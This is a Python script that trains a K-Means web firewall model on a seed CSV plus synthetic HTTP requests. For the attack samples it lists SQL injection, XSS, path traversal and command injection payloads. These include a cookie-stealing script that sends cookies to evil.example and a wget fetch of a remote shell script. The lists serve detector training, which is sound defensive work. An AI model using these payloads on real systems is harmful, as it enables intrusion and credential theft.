"""
Reproducible training for the Threat-Lens K-Means model.

    python train_model.py                 # original CSV + 4000 synthetic requests
    python train_model.py --synthetic 0   # original 67 rows only (not recommended)
Why
  * The original model was trained only on GET requests with header_count == 8,
    so body_length/header_count/method_* had zero variance. StandardScaler then
    leaves them unscaled, and any real POST request produced a distance of ~500
    to both centroids (i.e. a coin flip). Synthetic traffic with POSTs and a
    realistic header range removes that failure mode.
  * Here each cluster is labelled by the fraction of attack samples it contains (stored in waf_model_meta.json).

Outputs: waf_scaler.pkl, waf_kmeans_model.pkl, waf_model_meta.json
"""
import argparse
import csv
import json
import random
from pathlib import Path
from urllib.parse import quote

import joblib
import numpy as np
import sklearn
from sklearn.cluster import KMeans
from sklearn.preprocessing import StandardScaler

from waf_features import FEATURE_NAMES, extract_features, to_vector

HERE = Path(__file__).parent
CLIP = 5.0
TEMPERATURE = 1.0

# synthetic data
WORDS = ["red", "shoes", "laptop", "size", "how", "to", "reset", "password", "cheap",
         "flights", "pizza", "near", "me", "python", "tutorial", "blue", "widget", "sale"]
SLUGS = ["blue-widget", "summer-sale", "getting-started", "my-first-post", "contact-us",
         "release-notes-2024", "product-42", "annual-report"]
PATHS = ["/", "/index.html", "/about", "/contact", "/products", "/login", "/search", "/cart",
         "/checkout", "/api/v1/users", "/api/v1/orders", "/dashboard/settings",
         "/static/css/main.css", "/static/js/app.3f9a1c.js", "/docs/getting-started"]
SQLI = ["' OR '1'='1", "' OR 1=1--", "1 UNION SELECT username,password FROM users--",
        "1; DROP TABLE users--", "' AND SLEEP(5)--", "admin'--", "1 AND 1=1",
        "1' UNION SELECT NULL,table_name FROM information_schema.tables--",
        "1 UNION/**/SELECT/**/1,2,3"]
XSS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(document.cookie)",
       "<svg onload=alert(1)>", "\"><script>document.location='http://evil.example/?c='+document.cookie</script>",
       "<iframe src=javascript:alert(1)>"]
TRAV = ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd",
        "/etc/shadow", "..\\..\\windows\\win.ini", "/proc/self/environ"]
CMDI = ["; cat /etc/passwd", "| whoami", "$(id)", "`id`", "&& wget http://evil.example/x.sh", "; ls -la"]
PARAMS = ["id", "q", "search", "name", "user", "file", "page", "url", "cmd", "comment", "redirect"]


def _benign_query(rng):
    kind = rng.random()
    if kind < 0.25:
        return ""
    if kind < 0.50:
        return "q=" + "+".join(rng.sample(WORDS, rng.randint(1, 4)))
    if kind < 0.60:
        return f"page={rng.randint(1, 50)}&sort={rng.choice(['asc', 'desc'])}"
    if kind < 0.70:
        return f"id={rng.randint(1, 99999)}"
    if kind < 0.82:  # long but harmless tracking URLs: length alone must not mean "attack"
        return (f"utm_source=newsletter&utm_medium=email&utm_campaign={rng.choice(SLUGS)}"
                f"&utm_content={rng.choice(SLUGS)}&ref={rng.getrandbits(48):x}")
    if kind < 0.90:
        return f"category={rng.choice(SLUGS)}&min_price={rng.randint(1, 50)}&max_price={rng.randint(51, 900)}"
    if kind < 0.95:  # hard negatives: benign quotes / SQL-ish words
        return rng.choice(["q=men%27s+shoes", "q=o%27reilly+books", "q=select+a+plan+from+the+menu",
                           "name=D%27Angelo", "q=drop+shipping+guide"])
    return f"token={rng.getrandbits(128):032x}"


def _benign_body(rng):
    kind = rng.random()
    if kind < 0.4:
        return f"username=user{rng.randint(1, 999)}&password=Sup3r{rng.getrandbits(32):x}!"
    if kind < 0.8:
        return json.dumps({"name": "Alice", "email": f"a{rng.randint(1, 999)}@example.com",
                           "note": " ".join(rng.sample(WORDS, rng.randint(2, 8)))})
    return "comment=" + "+".join(rng.choices(WORDS, k=rng.randint(5, 60)))


def _benign_sample(rng):
    path = rng.choice(PATHS)
    if rng.random() < 0.3:
        path = f"/{rng.choice(['blog', 'products', 'api/v1/users'])}/{rng.choice(SLUGS + [str(rng.randint(1, 9999))])}"
    query = _benign_query(rng)
    uri = path + ("?" + query if query else "")
    method = rng.choices(["GET", "POST", "PUT"], weights=[70, 25, 5])[0]
    body = _benign_body(rng) if method in ("POST", "PUT") else ""
    return extract_features(method, uri, body, rng.randint(5, 16))


def _encode(rng, payload):
    r = rng.random()
    if r < 0.45:
        return quote(payload, safe="")                 # normal URL-encoding
    if r < 0.60:
        return payload.replace(" ", "+")               # plus for space
    if r < 0.67:
        return quote(quote(payload, safe=""), safe="")  # double-encoded
    return payload                                      # raw (mostly seen in bodies / lax clients)


def _attack_sample(rng):
    payload = rng.choice(rng.choice([SQLI, SQLI, XSS, TRAV, CMDI]))
    if rng.random() < 0.3:
        payload = "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in payload)
    place = rng.random()
    method, body = "GET", ""
    if place < 0.65:
        extra = f"&page={rng.randint(1, 9)}" if rng.random() < 0.3 else ""
        uri = f"{rng.choice(PATHS)}?{rng.choice(PARAMS)}={_encode(rng, payload)}{extra}"
    elif place < 0.80:
        uri = f"{rng.choice(PATHS)}/{_encode(rng, payload)}"
    else:
        uri, method = rng.choice(PATHS), "POST"
        body = f"{rng.choice(PARAMS)}={_encode(rng, payload)}&submit=1"
    return extract_features(method, uri, body, rng.randint(5, 16))


def synthetic(n, seed):
    rng = random.Random(seed)
    X, y = [], []
    for i in range(n):
        attack = i % 2 == 1
        f = _attack_sample(rng) if attack else _benign_sample(rng)
        X.append(to_vector(f))
        y.append(int(attack))
    return np.array(X), np.array(y)


def load_seed_csv(path):
    X, y = [], []
    with open(path, newline="") as fh:
        for row in csv.DictReader(fh):
            X.append([float(row[n]) for n in FEATURE_NAMES])
            y.append(int(row["label"]))
    return np.array(X), np.array(y)


# training
def attack_scores(X, scaler, model, attack_fraction):
    Z = np.clip(scaler.transform(X), -CLIP, CLIP)
    d = np.linalg.norm(Z[:, None, :] - model.cluster_centers_[None], axis=2)
    w = np.exp(-(d - d.min(axis=1, keepdims=True)) / TEMPERATURE)
    w /= w.sum(axis=1, keepdims=True)
    return w @ np.asarray(attack_fraction), d.argmin(axis=1)


def metrics(y, s):
    p = (s >= 0.5).astype(int)
    tp, fp = int(((p == 1) & (y == 1)).sum()), int(((p == 1) & (y == 0)).sum())
    fn, tn = int(((p == 0) & (y == 1)).sum()), int(((p == 0) & (y == 0)).sum())
    return {"accuracy": round((tp + tn) / len(y), 4), "precision": round(tp / max(tp + fp, 1), 4),
            "recall": round(tp / max(tp + fn, 1), 4), "false_positive_rate": round(fp / max(fp + tn, 1), 4),
            "tp": tp, "fp": fp, "fn": fn, "tn": tn}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--data", default=str(HERE / "waf_training_data.csv"))
    ap.add_argument("--synthetic", type=int, default=4000)
    ap.add_argument("--clusters", type=int, default=16)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--out", default=str(HERE))
    a = ap.parse_args()

    X, y = load_seed_csv(a.data)
    if a.synthetic:
        Xs, ys = synthetic(a.synthetic, a.seed)
        X, y = np.vstack([X, Xs]), np.concatenate([y, ys])
    idx = np.random.RandomState(a.seed).permutation(len(X))
    cut = int(len(X) * 0.8)
    tr, te = idx[:cut], idx[cut:]

    scaler = StandardScaler().fit(X[tr])
    zero_var = [n for n, s in zip(FEATURE_NAMES, scaler.var_) if s == 0]
    if zero_var:
        print("WARNING: zero-variance features (model will not generalise on them):", zero_var)
    model = KMeans(n_clusters=a.clusters, n_init=20, random_state=a.seed).fit(
        np.clip(scaler.transform(X[tr]), -CLIP, CLIP))

    labels = model.labels_
    frac = [float(y[tr][labels == c].mean()) if (labels == c).any() else 0.0 for c in range(a.clusters)]
    sizes = [int((labels == c).sum()) for c in range(a.clusters)]
    impure = [c for c, f in enumerate(frac) if 0.15 < f < 0.85]
    if impure:
        print("WARNING: clusters with mixed labels (attack fraction):", {c: round(frac[c], 2) for c in impure})

    s_tr, _ = attack_scores(X[tr], scaler, model, frac)
    s_te, _ = attack_scores(X[te], scaler, model, frac)
    m_tr, m_te = metrics(y[tr], s_tr), metrics(y[te], s_te)
    print("train:", m_tr)
    print("holdout:", m_te)
    print("cluster sizes:", sizes)
    print("cluster attack fractions:", [round(f, 2) for f in frac])

    out = Path(a.out)
    joblib.dump(scaler, out / "waf_scaler.pkl")
    joblib.dump(model, out / "waf_kmeans_model.pkl")
    meta = {"version": 1, "feature_names": FEATURE_NAMES, "n_clusters": a.clusters, "clip": CLIP,
            "temperature": TEMPERATURE, "cluster_attack_fraction": frac, "cluster_sizes": sizes,
            "trained_rows": int(len(tr)), "seed": a.seed, "sklearn_version": sklearn.__version__,
            "metrics": {"train": m_tr, "holdout": m_te},
            "note": "Trained largely on synthetic data; retrain on real traffic from waf_logs.csv."}
    (out / "waf_model_meta.json").write_text(json.dumps(meta, indent=2))
    print("saved scaler, model and waf_model_meta.json to", out)


if __name__ == "__main__":
    main()
